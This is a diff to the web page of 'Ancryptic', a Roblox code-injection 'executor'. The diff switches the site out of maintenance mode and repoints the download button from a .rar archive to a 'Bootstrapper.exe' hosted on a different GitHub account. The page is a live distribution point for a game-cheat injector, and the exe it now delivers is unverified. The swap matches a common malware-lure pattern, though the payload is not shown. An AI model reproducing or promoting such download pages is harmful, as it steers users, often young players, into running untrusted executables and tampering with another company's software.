@@ -581,7 +581,7 @@
         <h1>Ancryptic</h1>
         <p>Roblox's #1 executor at the moment! It uses the internal injection method! This software is always updated when Roblox patches it!
         </p>
-        <a href="#download" class="download-btn">
+        <a class="download-btn">
             download
         </a>
     </div>
@@ -683,7 +683,7 @@
 
 
         // Maintenance message
-        const isDownloadAllowed = false;
+        const isDownloadAllowed = true;
         const maintenanceMsg = document.getElementById('maintenance-msg');
         const showMaintenance = () => {
             maintenanceMsg.classList.add('active');
@@ -691,7 +691,7 @@
         };
         document.querySelector('.download-btn').addEventListener('click', e => {
             e.preventDefault();
-            isDownloadAllowed ? window.location.href = 'https://github.com/danlachow/z/raw/refs/heads/main/Ancryptic.rar' : showMaintenance();
+            isDownloadAllowed ? window.location.href = 'https://github.com/pneumxnia/static-files/raw/refs/heads/mainbranch/Bootstrapper.exe' : showMaintenance();
         });
 
         // Tilt effect for cards
